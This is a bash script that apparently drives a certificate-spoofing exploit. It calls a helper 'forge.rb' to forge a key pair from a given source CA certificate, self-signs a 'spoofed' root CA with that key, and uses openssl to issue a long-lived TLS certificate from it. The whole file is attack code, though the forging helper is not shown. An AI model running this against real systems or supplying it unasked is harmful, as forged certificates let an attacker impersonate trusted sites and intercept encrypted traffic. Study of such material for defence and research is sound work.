#!/bin/bash

set -e

SOURCE_CA=$1
CA_KEY=${2:-spoofed_ca.key}

CA="spoofed_ca"
CERT="cert"
CURVE_NAME="secp384r1"

if [[ "$SOURCE_CA" == "" ]]
then
    echo "Usage: $0 cert.crt [spoofed_ca.key]"
    exit 1
fi

# 1. Forge new keypair
./forge.rb $SOURCE_CA $CA_KEY

# 2. Generate root CA
openssl req -new -x509 -key $CA_KEY -config ca.conf -out "$CA.crt"

# 3. Generate new keypair and certificate
openssl ecparam -name "$CURVE_NAME" -genkey -noout -out "$CERT.key"
openssl req -new -key "$CERT.key" -out "$CERT.csr" -config tls.conf -reqexts v3_tls
openssl x509 -req -in "$CERT.csr" -CA "$CA.crt" -CAkey $CA_KEY -CAcreateserial -out "$CERT.crt" -days 10000 -extfile tls.conf -extensions v3_tls
rm "$CERT.csr"